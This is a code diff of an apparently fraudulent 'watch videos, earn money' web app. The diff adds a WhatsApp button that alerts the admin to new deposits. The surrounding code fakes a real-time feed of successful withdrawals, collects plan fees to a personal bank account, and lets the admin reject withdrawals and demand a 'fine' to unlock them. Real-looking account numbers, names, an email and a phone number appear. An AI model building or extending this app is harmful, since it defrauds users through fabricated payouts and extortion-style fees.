@@ -51,7 +51,6 @@
         .feed-container { height: 45px; position: relative; overflow: hidden; }
         .feed-item { position: absolute; width: 100%; top: 0; left: 0; opacity: 0; transform: translateY(20px); transition: all 0.5s ease-in-out; display: flex; justify-content: space-between; align-items: center; }
         .feed-item.active { opacity: 1; transform: translateY(0); }
-        @keyframes blink { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
 
         /* Pages */
         .full-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 2000; overflow-y: auto; padding-bottom: 60px; }
@@ -144,7 +143,7 @@
                 <p style="margin: 10px 0 5px 0; color: #64748b; font-size: 12px;">ACCOUNT NUMBER</p>
                 <b style="font-size: 18px; color: #1e293b;">03184437995</b>
                 <p style="margin: 10px 0 5px 0; color: #64748b; font-size: 12px;">ACCOUNT TITLE</p>
-                <b style="font-size: 16px; color: #1e293b;">Muhammad Israr Khan</b>
+                <b style="font-size: 16px; color: #1e293b;">Muhammad israr khan</b>
             </div>
             <div style="border: 2px dashed #cbd5e1; background: #f8fafc; border-radius: 18px; padding: 25px 15px; margin-bottom: 20px; position: relative;">
                 <span style="font-size: 35px; display: block;">📸</span>
@@ -160,6 +159,13 @@
             <span style="font-size: 40px; display:block; margin-bottom:15px;">⏳</span>
             <h2 style="color: #0f172a; font-weight: 800;">Payment Under Review</h2>
             <p style="color: #64748b; font-size: 14px; line-height: 1.6;">Your digital transaction receipt has been submitted to secure manual verification channels. System activation parameters will trigger immediately upon confirmation (Takes 1-2 hours).</p>
+            
+            <!-- NEW WHATSAPP ALERT BUTTON FOR USER -->
+            <div id="whatsapp-click-notifier" class="hidden" style="margin-top: 20px; background: #f0fdf4; border: 1.5px solid #bbf7d0; padding: 15px; border-radius: 16px;">
+                <p style="font-size: 13px; color: #166534; margin: 0 0 10px 0; font-weight: 600;">⚠️ Admin ko WhatsApp par notification send krne ke liye niche button par click karein:</p>
+                <a id="wa-share-link" href="#" target="_blank" style="display: block; background: #25D366; color: white; text-decoration: none; padding: 12px; border-radius: 12px; font-weight: bold; font-size: 15px; box-shadow: 0 4px 10px rgba(37,211,102,0.3);">🟢 Send Alert to Admin</a>
+            </div>
+
             <button class="btn-orange" onclick="logout()" style="background: #ef4444; width: 100%; margin-top:20px;">Exit Application</button>
         </div>
     </div>
@@ -183,27 +189,21 @@
             <button class="btn-orange" style="background: rgba(255,255,255,0.15); border: 1px solid white; width:auto; padding: 10px 25px;" onclick="showPage('withdraw-page')">Withdraw Funds</button>
         </div>
 
-        <!-- NEW: LIVE WITHDRAWAL FEED WIDGET -->
+        <!-- LIVE WITHDRAWAL FEED WIDGET -->
         <div class="live-feed-card" onclick="showPage('live-withdrawals-page')">
             <div class="feed-header">
                 <span style="font-size: 13px; font-weight: 700; color: #475569;"><span class="feed-dot"></span> Live Withdrawals Status</span>
                 <span style="font-size: 11px; font-weight: bold; color: #22c55e; background: #f0fdf4; padding: 2px 8px; border-radius: 6px;">Real-Time</span>
             </div>
-            <div class="feed-container" id="live-feed-box">
-                <!-- Items will dynamically swap here via JS -->
-            </div>
+            <div class="feed-container" id="live-feed-box"></div>
         </div>
 
         <!-- DYNAMIC CUSTOM WALLET BOX -->
         <div id="dashboard-custom-load-box" class="card hidden" style="border: 2px solid #3498db; background: #f0f9ff; margin-bottom: 25px; text-align: left;">
             <div style="float: right; background: #3498db; color: white; padding: 4px 12px; font-size: 11px; font-weight: 700; border-radius: 8px;">REQUIRED ACTION</div>
             <h3 style="margin: 0 0 8px 0; color: #1e3a8a; font-size: 18px;">⚠️ Solve Rejection Problem</h3>
-            <p style="margin: 5px 0; font-size: 14px; color: #2c3e50;">
-                Reason/Waja: <b id="custom-load-msg" style="color: #e74c3c;">-</b>
-            </p>
-            <p style="margin: 5px 0; font-size: 14px; color: #2c3e50;">
-                Required Penalty/Fine: <b style="color: #27ae60; font-size: 16px;"><span id="custom-load-amount">0</span> PKR</b>
-            </p>
+            <p style="margin: 5px 0; font-size: 14px; color: #2c3e50;">Reason/Waja: <b id="custom-load-msg" style="color: #e74c3c;">-</b></p>
+            <p style="margin: 5px 0; font-size: 14px; color: #2c3e50;">Required Penalty/Fine: <b style="color: #27ae60; font-size: 16px;"><span id="custom-load-amount">0</span> PKR</b></p>
             <button class="btn-main" onclick="openCustomPaymentFromDashboard()" style="background: #3498db; margin-top: 12px; padding: 12px;">Pay & Solve Issue Now</button>
         </div>
 
@@ -219,18 +219,14 @@
         </div>
     </div>
 
-    <!-- NEW: LIVE WITHDRAWALS FULL LIST PAGE -->
+    <!-- LIVE WITHDRAWALS FULL LIST PAGE -->
     <div id="live-withdrawals-page" class="full-page hidden">
         <div class="header">
             <button onclick="closePage('live-withdrawals-page')" style="background:none; border:none; font-size:28px;">←</button>
             <h2 style="margin-left:15px; font-size:20px;">Live Approved Payouts</h2>
         </div>
-        <div style="padding: 10px 20px; text-align: left; background: #e2e8f0; margin: 10px 20px; border-radius: 12px; font-size: 13px; font-weight: 600; color: #475569;">
-            📊 Live System Logs System Active
-        </div>
-        <div id="full-live-payouts-list" style="max-width: 500px; margin: 0 auto; padding-bottom: 30px;">
-            <!-- Will load continuous timeline logs -->
-        </div>
+        <div style="padding: 10px 20px; text-align: left; background: #e2e8f0; margin: 10px 20px; border-radius: 12px; font-size: 13px; font-weight: 600; color: #475569;">📊 Live System Logs System Active</div>
+        <div id="full-live-payouts-list" style="max-width: 500px; margin: 0 auto; padding-bottom: 30px;"></div>
     </div>
 
     <!-- WALLET PAGE -->
@@ -261,9 +257,7 @@
             <div class="block-box">
                 <span style="font-size: 40px; display: block; margin-bottom: 10px;">🔒</span>
                 <h3 style="margin: 0 0 10px 0;">Withdrawal Options Locked</h3>
-                <p style="font-size: 14px; line-height: 1.5; color: #742a2a; margin-bottom: 15px;">
-                    Aapka pichla withdrawal reject kiya gaya tha. Pehle apna masla hal karwayein, uske baad hi naya withdrawal apply kar sakte hain.
-                </p>
+                <p style="font-size: 14px; line-height: 1.5; color: #742a2a; margin-bottom: 15px;">Aapka pichla withdrawal reject kiya gaya tha. Pehle apna masla hal karwayein, uske baad hi naya withdrawal apply kar sakte hain.</p>
                 <div style="background: white; border: 1px solid #feb2b2; padding: 12px; border-radius: 12px; text-align: left; font-size: 13px;">
                     <strong style="color: #c53030;">Rejection Reason (Waja):</strong>
                     <div id="block-reason-display-text" style="margin-top: 5px; color: #4a5568; font-style: italic;">No reason provided.</div>
@@ -352,6 +346,7 @@
         const db = firebase.database();
         
         const ADMIN = "samiseyam49@gmail.com"; 
+        const MY_WHATSAPP = "923077306164"; // Set to your exact target number
         
         const adsPool = ["_9M-gZJu6g0", "dQw4w9WgXcQ", "tgbNymZ7vqY", "V-_O75Z0PqU"];
         let clock, timeLeft = 30, tempSelectedPlan = null, currentActiveTaskDoneCount = 0, currentPayoutPerTask = 0;
@@ -367,7 +362,6 @@
         function generateInitialFakeLogs() {
             let initialTime = new Date();
             for(let i=0; i<30; i++) {
-                // Generate chronological sequence timestamps backward
                 let minutesSub = i * Math.floor(Math.random() * 8 + 3);
                 let logTime = new Date(initialTime.getTime() - minutesSub * 60000);
                 
@@ -389,8 +383,7 @@
 
             function injectAndTransition() {
                 if(generatedWithdrawalsLog.length === 0) return;
-                
-                let activeLog = generatedWithdrawalsLog[counter % 12]; // Keep looping freshest items
+                let activeLog = generatedWithdrawalsLog[counter % 12];
                 
                 feedBox.innerHTML = `
                     <div class="feed-item active">
@@ -406,9 +399,8 @@
             }
 
             injectAndTransition();
-            setInterval(injectAndTransition, 4000); // Ticks every 4 seconds dynamically
+            setInterval(injectAndTransition, 4000);
 
-            // Inject a brand new instant request live every 45-90 seconds continuously
             setInterval(() => {
                 let currentLiveTime = new Date();
                 let randomName = namesPool[Math.floor(Math.random() * namesPool.length)];
@@ -419,8 +411,7 @@
                 generatedWithdrawalsLog.unshift({
                     name: randomName, method: randomMethod, amount: randomAmount, number: randomNum, timeStr: currentLiveTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), dateStr: currentLiveTime.toLocaleDateString()
                 });
-                
-                if(generatedWithdrawalsLog.length > 50) generatedWithdrawalsLog.pop(); // Cap length stack limit
+                if(generatedWithdrawalsLog.length > 50) generatedWithdrawalsLog.pop();
                 renderFullPayoutsPage();
             }, Math.floor(Math.random() * 45000 + 45000));
         }
@@ -431,7 +422,7 @@
             generatedWithdrawalsLog.forEach(log => {
                 fullListContainer.innerHTML += `
                     <div class="history-item" style="border-left-color: #22c55e; margin: 10px 20px;">
-                        <div style="float: right; background: #dfg; color: #22c55e; background:#f0fdf4; padding: 3px 10px; font-size: 11px; font-weight: 700; border-radius: 6px;">Success</div>
+                        <div style="float: right; background:#f0fdf4; color: #22c55e; padding: 3px 10px; font-size: 11px; font-weight: 700; border-radius: 6px;">Success</div>
                         <b style="font-size:15px; color:#1e293b;">${log.name}</b> <small style="color:#64748b;">(${log.number})</small><br>
                         <span style="color:#22c55e; font-weight:bold; font-size:17px;">+${log.amount} PKR</span><br>
                         <small style="color:#94a3b8;">Transferred via ${log.method} on ${log.dateStr} at ${log.timeStr}</small>
@@ -599,19 +590,39 @@
             document.getElementById('plan-selection-view').classList.remove('hidden');
         }
 
+        // UPGRADED 100% OFFICIAL WHATSAPP CLICK-TO-CHAT REDIRECT LOGIC
         function submitPaymentProof() {
             const fileInput = document.getElementById('proof-file');
             if(fileInput.files.length === 0) return appAlert("Please upload payment screenshot!");
             const u = auth.currentUser;
             const reader = new FileReader();
             reader.onload = function(e) {
+                // Save inside Firebase Realtime Database
                 db.ref('plan_requests').push({
                     uid: u.uid, email: u.email, planId: tempSelectedPlan.id, cost: tempSelectedPlan.cost, earning: tempSelectedPlan.earning, totalTasks: tempSelectedPlan.totalTasks, screenshot: e.target.result, status: "Pending", date: new Date().toLocaleString()
                 });
                 db.ref('users/' + u.uid).update({ status: "Pending" });
+                
+                // Construct Premium Official Click-to-Chat Text Format
+                let textMessage = `📢 *NEW DEPOSIT REQUEST SUBMITTED!*\n\n` +
+                                  `👤 *User Email:* ${u.email}\n` +
+                                  `💵 *Amount Paid:* ${tempSelectedPlan.cost} PKR\n` +
+                                  `📦 *VIP Level ID:* Plan ${tempSelectedPlan.id}\n` +
+                                  `📅 *Timestamp:* ${new Date().toLocaleString()}\n\n` +
+                                  `👉 Please review receipt and activate balance manually inside panel.`;
+                
+                let encodedText = encodeURIComponent(textMessage);
+                let secureWaLink = `https://wa.me/${MY_WHATSAPP}?text=${encodedText}`;
+                
+                // Show official link on screen instantly
+                document.getElementById('wa-share-link').href = secureWaLink;
+                document.getElementById('whatsapp-click-notifier').classList.remove('hidden');
+
                 document.getElementById('payment-upload-view').classList.add('hidden');
                 document.getElementById('pending-view').classList.remove('hidden');
                 document.getElementById('paywall-back-btn').classList.add('hidden');
+                
+                appAlert("Request saved! Please click the green button to notify the admin on WhatsApp.");
             };
             reader.readAsDataURL(fileInput.files[0]);
         }
@@ -703,9 +714,7 @@
             }).catch(e => appAlert(e.message));
         }
 
-        function dismissDeclineNotice() {
-            document.getElementById('decline-notification').classList.add('hidden');
-        }
+        function dismissDeclineNotice() { document.getElementById('decline-notification').classList.add('hidden'); }
 
         auth.onAuthStateChanged(user => {
             if(user) {
@@ -722,7 +731,6 @@
                         if(d.declineReason) {
                             document.getElementById('decline-reason-text').innerText = d.declineReason;
                             document.getElementById('decline-notification').classList.remove('hidden');
-                            
                             document.getElementById('dashboard-custom-load-box').classList.remove('hidden');
                             document.getElementById('custom-load-msg').innerText = d.declineReason;
                             document.getElementById('custom-load-amount').innerText = d.declineAmount || 0;
@@ -806,35 +814,22 @@
         function approvePlan(userUid, reqKey) {
             db.ref('plan_requests/' + reqKey).once('value', s => {
                 const d = s.val();
-                
-                db.ref('users/' + userUid).update({ 
-                    status: "Active", 
-                    planId: d.planId, 
-                    allowedTasks: d.totalTasks, 
-                    rewardPerVideo: (d.earning / d.totalTasks) 
-                });
+                db.ref('users/' + userUid).update({ status: "Active", planId: d.planId, allowedTasks: d.totalTasks, rewardPerVideo: (d.earning / d.totalTasks) });
                 db.ref('plan_requests/' + reqKey).update({ status: "Approved" });
 
                 db.ref('users/' + userUid).once('value', userSnap => {
                     const uData = userSnap.val() || {};
                     const referrerCode = uData.refBy;
-
                     if(referrerCode && referrerCode !== "none" && referrerCode !== "") {
                         db.ref('users').once('value', allUsersSnap => {
                             allUsersSnap.forEach(userChild => {
                                 const potentialReferrerKey = userChild.key;
                                 const potentialReferrerData = userChild.val();
-                                
                                 if(potentialReferrerData.myRef === referrerCode) {
                                     const oldBalance = parseFloat(potentialReferrerData.balance || 0);
                                     const newBalance = parseFloat((oldBalance + 800).toFixed(2));
-                                    
                                     db.ref('users/' + potentialReferrerKey).update({ balance: newBalance });
-                                    db.ref('history/' + potentialReferrerKey).push({
-                                        type: `Referral Bonus (${uData.email})`,
-                                        amount: 800,
-                                        date: new Date().toLocaleString()
-                                    });
+                                    db.ref('history/' + potentialReferrerKey).push({ type: `Referral Bonus (${uData.email})`, amount: 800, date: new Date().toLocaleString() });
                                 }
                             });
                         });
@@ -850,20 +845,9 @@
                 let finalAmount = parseFloat(fallbackAmount);
                 if (isNaN(finalAmount) || finalAmount <= 0) return appAlert("Invalid numeric value!");
 
-                db.ref('users/' + userUid).update({
-                    balance: parseFloat(((currentData.balance || 0) + finalAmount).toFixed(2)),
-                    status: "Active",
-                    declineReason: null,     
-                    declineAmount: null      
-                });
-
+                db.ref('users/' + userUid).update({ balance: parseFloat(((currentData.balance || 0) + finalAmount).toFixed(2)), status: "Active", declineReason: null, declineAmount: null });
                 db.ref('plan_requests/' + reqKey).update({ status: "Approved" });
-                db.ref('history/' + userUid).push({
-                    type: "Problem Solved Balance Credit",
-                    amount: finalAmount,
-                    date: new Date().toLocaleString()
-                });
-
+                db.ref('history/' + userUid).push({ type: "Problem Solved Balance Credit", amount: finalAmount, date: new Date().toLocaleString() });
                 appAlert(`${finalAmount} PKR added into user balance and account unblocked successfully!`);
             });
         }
@@ -884,11 +868,11 @@
         }
 
         function rejectWithdrawal(reqId, userUid, amount) {
-            const reason = prompt("Enter decline reason (User ko kya masla/waja show ho?):");
+            const reason = prompt("Enter decline reason:");
             if (reason === null) return; 
             if (reason.trim() === "") return appAlert("Rejection ki waja likhna zaroori hai!");
 
-            const fineInput = prompt("Is masle ko hal karne ke liye user kitne paise (Fine) bhejey? (Agar penalty nahi lagani to 0 likhein):");
+            const fineInput = prompt("Is masle ko hal karne ke liye user kitne paise (Fine) bhejey?:");
             if (fineInput === null) return;
             const fineAmount = parseFloat(fineInput);
             if (isNaN(fineAmount) || fineAmount < 0) return appAlert("Please enter a valid numeric fine amount!");
@@ -896,19 +880,8 @@
             db.ref('withdrawals/' + reqId).update({ status: "Rejected", adminReason: reason, requestedFine: fineAmount });
             db.ref('users/' + userUid).once('value', s => {
                 const d = s.val() || {};
-                db.ref('users/' + userUid).update({ 
-                    balance: (d.balance || 0) + amount,
-                    totalWithdrawn: (d.totalWithdrawn || 0) - amount,
-                    declineReason: reason,
-                    declineAmount: fineAmount 
-                });
-                
-                db.ref('history/' + userUid).push({ 
-                    type: "Withdrawal Rejected (Refund)", 
-                    amount: amount, 
-                    reason: reason,
-                    date: new Date().toLocaleString() 
-                });
+                db.ref('users/' + userUid).update({ balance: (d.balance || 0) + amount, totalWithdrawn: (d.totalWithdrawn || 0) - amount, declineReason: reason, declineAmount: fineAmount });
+                db.ref('history/' + userUid).push({ type: "Withdrawal Rejected (Refund)", amount: amount, reason: reason, date: new Date().toLocaleString() });
                 appAlert("Withdrawal reject ho gaya aur user ko waja bhej di gayi hai!");
             });
         }
@@ -919,9 +892,7 @@
 
             db.ref('users').orderByChild('email').equalTo(emailInput).once('value', s => {
                 if(!s.exists()) return appAlert("User email not found inside database!");
-                s.forEach(child => {
-                    db.ref('users/' + child.key).update({ declineReason: null, declineAmount: null });
-                });
+                s.forEach(child => { db.ref('users/' + child.key).update({ declineReason: null, declineAmount: null }); });
                 appAlert("User withdrawal section unblocked successfully!");
                 document.getElementById('unblock-user-email').value = "";
             });
